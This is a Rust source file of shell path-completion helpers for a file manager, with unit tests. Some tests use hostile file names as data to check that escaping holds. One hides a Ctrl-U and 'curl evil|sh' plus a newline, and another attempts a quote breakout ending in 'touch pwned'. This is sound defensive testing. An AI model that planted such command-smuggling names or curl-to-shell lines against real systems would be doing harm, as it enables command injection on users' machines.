//! Path completion helpers (pure; unit-tested): splitting the word before the cursor, resolving
//! its directory part, and the final word text for a completed name. The candidate listing
//! itself runs on the I/O pool (invariant 2) and matches with
//! [`ofm_core::cmdline::complete_in`].

use std::ffi::OsStr;
use std::path::PathBuf;

use ofm_core::Location;

use crate::navigation::goto;

/// The word before the cursor, split for completion.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct WordAtCursor<'a> {
    /// The line before the word starts (kept when replacing the word).
    pub before_word: &'a str,
    /// Directory part of the word including its trailing `/` (empty = the panel directory).
    pub dir: &'a str,
    /// The fragment to complete (the part after the last `/`).
    pub prefix: &'a str,
}

/// Characters that end the word before the cursor (shell separators; a new argument starts
/// after them). Quoting is not interpreted — completion inside quotes works only when the
/// quoted text has no separators (v1 trade-off: no match, no harm).
fn is_word_separator(c: char) -> bool {
    c.is_whitespace() || matches!(c, ';' | '&' | '|' | '<' | '>' | '(' | ')' | '#' | '`')
}

/// Split the line `text` at byte offset `cursor` (the entry's cursor position, always on a
/// character boundary; clamped) into the word under the cursor and what precedes it.
pub fn split_word_before(text: &str, cursor: usize) -> WordAtCursor<'_> {
    let cursor = cursor.min(text.len());
    let before = &text[..cursor];
    let start = before.rfind(is_word_separator).map_or(0, |i| {
        i + before[i..].chars().next().map_or(1, char::len_utf8)
    });
    let word = &before[start..];
    match word.rfind('/') {
        Some(i) => WordAtCursor {
            before_word: &before[..start],
            dir: &word[..=i],
            prefix: &word[i + 1..],
        },
        None => WordAtCursor {
            before_word: &before[..start],
            dir: "",
            prefix: word,
        },
    }
}

/// Resolve the directory part of a word: `~`/`~/…` against `home`, absolute as-is, relative
/// against the active panel's directory (for non-local panels there is none — `/` is used, a
/// harmless stand-in that keeps completion usable). Lexical `.`/`..` cleanup included
/// ([`goto::resolve_input`]); no file system access happens here.
pub fn completion_dir(dir_frag: &str, panel: &Location, home: &std::path::Path) -> PathBuf {
    let base = match panel {
        Location::Local(p) => p.clone(),
        Location::Archive { .. } | Location::List { .. } => PathBuf::from("/"),
    };
    goto::resolve_input(dir_frag, &base, home)
}

/// Characters that need no shell quoting inside a completed word.
fn is_word_safe(c: char) -> bool {
    c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '/' | '@' | '=' | ':' | ',' | '+')
}

/// The text a completed `name` contributes to the entry: plain when every character is
/// shell-safe, otherwise the quoted form for the shell's `style`
/// ([`ofm_core::cmdline::shell_quote_for`] — control bytes and non-UTF-8 names become `\xNN`
/// escapes the shell expands back to the exact bytes, so no raw control byte ever reaches the
/// line editor); directories get a trailing `/`.
pub fn completed_word(name: &OsStr, is_dir: bool, style: ofm_core::cmdline::QuoteStyle) -> String {
    let mut text = match name.to_str() {
        Some(s) if !s.is_empty() && s.chars().all(is_word_safe) => s.to_owned(),
        _ => ofm_core::cmdline::shell_quote_for(style, name),
    };
    if is_dir {
        text.push('/');
    }
    text
}

/// The common-prefix [`ofm_core::cmdline::Completion::extend`] as text that can be typed
/// literally into the entry: `None` when it is not valid UTF-8 or contains characters that
/// would need quoting (then only the candidate list is shown).
pub fn extend_typable(ext: &OsStr) -> Option<String> {
    let s = ext.to_str()?;
    s.chars().all(is_word_safe).then(|| s.to_owned())
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used)]
mod tests {
    const P: ofm_core::cmdline::QuoteStyle = ofm_core::cmdline::QuoteStyle::Posix;
    const F: ofm_core::cmdline::QuoteStyle = ofm_core::cmdline::QuoteStyle::Fish;
    use std::ffi::OsString;
    use std::os::unix::ffi::OsStringExt;
    use std::path::Path;

    use super::*;

    fn split(text: &str, cursor: usize) -> (&str, &str, &str) {
        let w = split_word_before(text, cursor);
        (w.before_word, w.dir, w.prefix)
    }

    #[test]
    fn split_words() {
        assert_eq!(split("cd su", 5), ("cd ", "", "su"));
        assert_eq!(split("cd /et", 6), ("cd ", "/", "et"));
        assert_eq!(
            split("mplayer ../mu/sic", 17),
            ("mplayer ", "../mu/", "sic")
        );
        // Cursor right after the separator: empty prefix.
        assert_eq!(split("mplayer ../mu/", 14), ("mplayer ", "../mu/", ""));
        assert_eq!(split("cd ~/sr", 7), ("cd ", "~/", "sr"));
        assert_eq!(split("", 0), ("", "", ""));
        // Cursor in the middle: only the text before it counts.
        assert_eq!(split("ab|cd", 2), ("", "", "ab"));
        // Separators end the word.
        assert_eq!(split("ls |gre", 7), ("ls |", "", "gre"));
        assert_eq!(split("make; cd x", 10), ("make; cd ", "", "x"));
        // A space inside quotes still ends the word (documented v1 trade-off: no match, no harm).
        assert_eq!(split("cd 'my dir/fi", 13), ("cd 'my ", "dir/", "fi"));
        // A quoted word without separators keeps its quotes (no match is found for it).
        assert_eq!(split("cd 'na", 6), ("cd ", "", "'na"));
    }

    #[test]
    fn dirs_resolve_against_panel_home_and_root() {
        let home = Path::new("/home/u");
        let panel = Location::Local("/work/proj".into());
        assert_eq!(
            completion_dir("", &panel, home),
            PathBuf::from("/work/proj")
        );
        assert_eq!(completion_dir("/", &panel, home), PathBuf::from("/"));
        assert_eq!(
            completion_dir("sub/", &panel, home),
            PathBuf::from("/work/proj/sub")
        );
        assert_eq!(
            completion_dir("../sib/", &panel, home),
            PathBuf::from("/work/sib")
        );
        assert_eq!(completion_dir("~", &panel, home), PathBuf::from("/home/u"));
        assert_eq!(
            completion_dir("~/src", &panel, home),
            PathBuf::from("/home/u/src")
        );
        assert_eq!(completion_dir("/etc/", &panel, home), PathBuf::from("/etc"));
        // Non-local panels: no directory to resolve against.
        let archive = Location::Archive {
            archive: "/x.zip".into(),
            inner: "".into(),
        };
        assert_eq!(completion_dir("", &archive, home), PathBuf::from("/"));
    }

    #[test]
    fn completed_words() {
        assert_eq!(completed_word(OsStr::new("a.txt"), false, P), "a.txt");
        assert_eq!(completed_word(OsStr::new("sub"), true, P), "sub/");
        assert_eq!(
            completed_word(OsStr::new("plain.v2.tar"), false, P),
            "plain.v2.tar"
        );
        // Spaces and quotes need quoting (parse_cd understands quoted operands).
        assert_eq!(completed_word(OsStr::new("my dir"), true, P), "'my dir'/");
        assert_eq!(completed_word(OsStr::new("it's"), false, P), "'it'\\''s'");
        // Shell metacharacters, too.
        assert_eq!(completed_word(OsStr::new("~home"), false, P), "'~home'");
        assert_eq!(completed_word(OsStr::new("a*b"), false, P), "'a*b'");
    }

    #[test]
    #[cfg(unix)]
    fn non_utf8_names_use_ansi_c_quoting() {
        let name = OsString::from_vec(b"\xffna\xfeme".to_vec());
        assert_eq!(completed_word(&name, false, P), "$'\\xffna\\xfeme'");
        assert_eq!(completed_word(&name, true, P), "$'\\xffna\\xfeme'/");
    }

    #[test]
    #[cfg(unix)]
    fn control_bytes_are_escaped_never_raw() {
        // A name holding Ctrl-U / newline would be acted on by readline, zle and fish's reader
        // even inside quotes: the typed text carries printable escapes instead.
        let name = OsString::from_vec(b"\x15curl evil|sh\n".to_vec());
        assert_eq!(completed_word(&name, false, P), "$'\\x15curl evil|sh\\x0a'");
        assert_eq!(completed_word(&name, true, F), "\\x15'curl evil|sh'\\x0a/");
        for style in [P, F] {
            assert!(
                !completed_word(&name, false, style)
                    .bytes()
                    .any(|b| b < 0x20 || b == 0x7f)
            );
        }
        // fish is not POSIX: a backslash-quote name must not break out of the quotes.
        assert_eq!(
            completed_word(OsStr::new("\\'; touch pwned; #"), false, F),
            "'\\\\\\'; touch pwned; #'"
        );
    }

    #[test]
    fn typable_extensions() {
        assert_eq!(
            extend_typable(&OsString::from("sub")),
            Some("sub".to_owned())
        );
        assert_eq!(extend_typable(&OsString::from("")), Some(String::new()));
        // Needs quoting: not typed literally.
        assert_eq!(extend_typable(&OsString::from("a b")), None);
        assert_eq!(extend_typable(&OsString::from("it's")), None);
        assert_eq!(extend_typable(&OsString::from("x$y")), None);
    }

    #[test]
    #[cfg(unix)]
    fn non_utf8_extension_is_not_typable() {
        assert_eq!(
            extend_typable(&OsString::from_vec(b"na\xffme".to_vec())),
            None
        );
    }
}
